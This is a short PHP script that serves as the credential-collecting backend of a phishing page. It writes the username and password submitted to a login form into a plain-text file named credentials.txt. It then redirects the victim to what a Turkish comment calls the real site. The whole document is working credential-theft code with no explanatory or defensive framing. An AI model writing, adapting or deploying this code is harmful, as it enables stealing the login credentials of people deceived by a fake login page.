<?php
$file = fopen("credentials.txt", "a");
fwrite($file, "Username: " . $_POST['username'] . "\n");
fwrite($file, "Password: " . $_POST['password'] . "\n\n");
fclose($file);
header('Location: https://www.example.com');  // Gerçek siteye yönlendirme
exit();
?>
